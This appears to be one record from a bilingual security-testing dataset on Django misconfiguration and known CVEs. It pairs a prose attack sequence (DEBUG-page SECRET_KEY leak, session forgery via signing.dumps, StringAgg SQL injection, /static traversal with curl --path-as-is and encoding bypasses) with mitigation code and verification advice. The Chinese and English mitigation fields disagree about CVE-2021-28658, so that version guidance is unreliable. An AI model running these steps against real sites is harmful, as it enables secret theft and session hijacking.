exploitation.en: Use payloads in list order: request a nonexistent path to trigger the DEBUG page and confirm SECRET_KEY and database-setting leakage; with the key, forge session values via step 3's signing.dumps verified by loads; then test StringAgg injection with step 1's SQL fragments inside __contains values; finally verify /static traversal with step 4's curl --path-as-is. Use path-encoding variants when blocked.

mitigation.zh:
升级到修复 CVE-2020-7471（2.2.11+）的版本；CVE-2021-28658（3.1.9+）仅适用于 collectstatic/findstatic 对符号链接目录的处理，与运行期 /static URL 穿越无关；生产关闭 DEBUG，SECRET_KEY 改环境注入并轮换已泄露值；StringAgg delimiter 做白名单；静态服务限定根目录并规范化 ../。
    # settings.py
    DEBUG = False
    SECRET_KEY = os.environ['DJANGO_SECRET_KEY']
    # delimiter 白名单（CVE-2020-7471）
    if delimiter not in {',', ';', '|'}:
        raise ValueError('invalid delimiter')
    StringAgg('name', delimiter=delimiter)
mitigation.en: Disable DEBUG in production, move SECRET_KEY into secret management and rotate leaked keys, upgrade to versions fixing CVE-2020-7471 and CVE-2021-28658, and normalize static paths within a confined root. After the fix, replay steps 1-4 and confirm error pages leak nothing, signature checks reject forgeries, and traversal is denied.

analysis.zh: Django 版本与安全配置回归只有在唯一输入、最终解析或授权结果、服务端日志和可观察影响相互一致时才能确认。单一状态码、超时、错误文本、客户端显示或工具猜测只应作为线索，必须保留阴性对照和版本条件。
analysis.en: Django Version and Security-Configuration Regression is confirmed only when the unique input, final parsing or authorization result, server-side logs, and observable impact agree. A status code, timeout, error string, client display, or tool guess is only a lead; retain a negative control and exact version prerequisites.

review.rationale: WAF4 批次3：按低密度域补强（Web 框架回归域）追加 PATH_INFO 解码与双斜杠路由差分。
